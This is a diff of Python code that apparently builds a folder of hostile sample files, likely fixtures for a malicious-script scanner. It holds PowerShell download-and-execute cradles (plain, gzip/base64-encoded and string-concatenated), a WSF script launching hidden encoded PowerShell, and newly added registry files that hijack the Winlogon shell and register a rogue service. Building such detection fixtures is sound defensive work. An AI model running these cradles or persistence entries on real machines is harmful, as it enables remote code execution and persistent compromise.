@@ -236,6 +236,8 @@ def build_folder(root):
     _gzp = _gz.compress(b"powershell IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/a') " * 2)
     w("gzpeek.ps1", b"$d = '" + _b64.b64encode(_gzp) + b"'; IEX $d\n")
     w("concat.ps1", b"$w = New-Object Net.WebClient; \"ie\"+\"x\"($w.DownloadString('http://10.1.1.1/a'))\n")
+    w("winlogon.reg", b'RegEdit4\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]\r\n"Shell"="expl.exe"\r\n')
+    w("svc.reg", b'RegEdit4\r\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Evil]\r\n"ImagePath"="C:\\g\\svc.exe"\r\n')
     w("wsh.wsf", b"<?xml version=\"1.0\"?>\n<package><job><script language=\"VBScript\">\n"
                  b'Set s = CreateObject("WScript.Shell")\ns.Run "powershell -w hidden -enc AAA"\n'
                  b"</script></job></package>\n")
